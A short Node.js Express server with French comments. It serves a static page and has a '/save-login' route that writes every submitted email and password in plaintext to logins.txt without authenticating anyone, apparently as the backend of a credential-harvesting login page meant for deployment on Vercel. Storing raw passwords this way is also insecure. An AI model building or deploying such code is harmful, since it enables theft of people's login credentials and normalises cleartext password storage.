const express = require("express");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();

// Middleware pour servir les fichiers statiques dans le dossier "public"
app.use(express.static(path.join(__dirname, "public")));

// Middleware pour parser les données du formulaire
app.use(bodyParser.urlencoded({ extended: true }));

// Route pour afficher la page d'accueil (index.html)
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Route pour enregistrer les données du login
app.post("/save-login", (req, res) => {
  const { email, password } = req.body;

  // Format des données à enregistrer
  const logEntry = `Email: ${email}, Password: ${password}\n`;

  // Enregistrer les données dans un fichier texte
  fs.appendFile("logins.txt", logEntry, (err) => {
    if (err) {
      console.error("Erreur lors de l'écriture dans le fichier :", err);
      return res.status(500).send("Erreur côté serveur");
    }
    console.log("Données enregistrées avec succès !");
    res.send("Login enregistré avec succès !");
  });
});

// Démarrer le serveur sur le port spécifié par Vercel ou 3000 par défaut
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Serveur démarré sur http://localhost:${PORT}`);
});
